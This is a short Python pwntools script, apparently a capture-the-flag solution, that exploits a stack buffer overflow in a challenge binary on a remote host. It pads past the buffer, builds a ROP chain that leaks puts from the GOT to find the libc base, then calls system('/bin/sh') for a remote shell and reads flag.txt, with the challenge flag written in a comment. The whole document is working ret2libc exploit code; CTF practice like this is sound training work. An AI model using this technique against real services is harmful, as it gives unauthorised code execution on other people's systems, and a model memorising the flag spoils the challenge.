#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chall", checksec=False)
context.binary = elf

libc = ELF("./libc-2.27.so", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="b main")
p = remote("chall.ehax.tech", 4269)

rop = ROP(elf)
rop.raw(b"A" * 0xa8)
rop.puts(elf.got["puts"])
rop.raw(elf.sym["main"])
p.sendline(rop.chain())

p.readuntil(b"Failed Login\n")

leak = u64(p.recv(6) + b"\x00\x00")
libc.address = leak - libc.sym["puts"]
log.success(f"libc: {hex(libc.address)}")

rop = ROP(libc)
rop.raw(b"A" * 0xa8)
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
p.sendline(rop.chain())

p.readuntil(b"Failed Login\n")
p.sendline(b"/bin/cat flag.txt")
print(p.readline().decode()[:-1]) # EH4X{st4n_l33_c4m30_m1ss1ng_dOOoOoOoOoOOm}
